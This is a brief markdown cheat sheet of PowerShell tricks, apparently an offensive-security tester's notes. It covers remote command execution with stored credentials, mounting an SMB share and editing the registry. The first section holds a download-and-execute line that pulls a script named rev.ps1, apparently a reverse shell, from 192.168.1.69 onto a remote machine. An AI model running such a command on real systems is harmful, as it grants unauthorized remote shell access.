# powershell tricks

## run powershell commands as another user with ps
```powershell
$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\user', $pass)
hostname
invoke-command -Computer ComputerHostname -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```
change ComputerHostname.
`-ConfigurationName ...` parameter might be required to run commands for special restricted user permissions

## mount smb share as drive "letter"
```powershell
New-PSDrive -Name "temp" -PSProvider "FileSystem" -Root "\\192.168.1.69\temp"
# with PSCredential
$pass = ConvertTo-SecureString 'password123' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('.\use1', $pass)
New-PSDrive -Name "temp" -PSProvider "FileSystem" -Credential $cred -Root "\\192.168.1.69\temp"
```

## browse and edit registry

### set registry values
```powershell
Set-ItemProperty -Path "HKLM:\Software\ContosoCompany" -Name "NoOfEmployees" -Value 823
Get-ItemProperty -Path "HKLM:\Software\ContosoCompany"
```

### read registry values
can also change the powershell "directory" to the registry like "cd HKLM:\"
```powershell
cd HKLM:\SYSTEM\CurrentControlSet\Services\
```
